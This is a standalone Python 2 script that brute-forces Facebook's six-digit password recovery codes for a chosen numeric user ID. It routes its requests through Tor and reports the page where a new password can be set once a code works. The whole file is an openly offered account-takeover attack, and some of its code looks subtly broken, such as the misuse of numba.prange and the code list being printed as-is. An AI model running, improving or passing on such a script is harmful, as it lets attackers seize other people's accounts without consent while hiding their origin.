#!/usr/bin/python2.7
import urllib
import httplib
import socks
import socket
import numba

#Torify
socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
socket.socket = socks.socksocket

print "you have to trigger the password recovery at https://www.facebook.com/login/identify/?ctx=recover"
connection = httplib.HTTPSConnection("www.facebook.com", 443)
user = raw_input("Enter user numerical ID: ")

headers={"Host":"www.facebook.com", "User-Agent":"oct. 03, 2019, 08:48:12", "Accept-Language": "en-US, en"}

code = ['0', '0', '0', '0', '0', '0']
index = [0, 0, 0, 0, 0, 0]
rain = 0
count = 0
cs = "0123456789"

print "One million recovery code to test, be patient"
for index[0] in range(10):
        for index[1] in range(10):
                for index[2] in range(10):
                        for index[3] in range(10):
                                for index[4] in range(10):
                                        for index[5] in numba.prange(10):
                                                #Let it rain !#############################
                                                for x in range(6):                 #
                                                        code[x] = cs[(index[x]+rain)%10]  #
                                                        rain += x+1                       #
                                                for x in range(1, 7):              #
                                                        rain -= x                         #
                                                rain -= 4                                 #
                                                ###########################################
                                                query = urllib.urlencode({"u":"%s" % user, "n":"%c%c%c%c%c%c" % (code[0], code[1], code[2], code[3], code[4], code[5])})
                                                if count % 1000 == 0:
                                                        print "%f%% done" % (float(count)*100.0/1000000.0)
                                                connection.request('GET', "/recover/password/?%s" % query, headers=headers)
                                                answer = connection.getresponse()
                                                if answer.read().find("Choose a New Password") >= 0:
                                                        print "go to the page https://www.facebook.com/recover/password/?u=%s&n=%s&s=23&exp_locale=en_US&redirect_from=button" % (user, code)
                                                        exit(0)
                                                count += 1
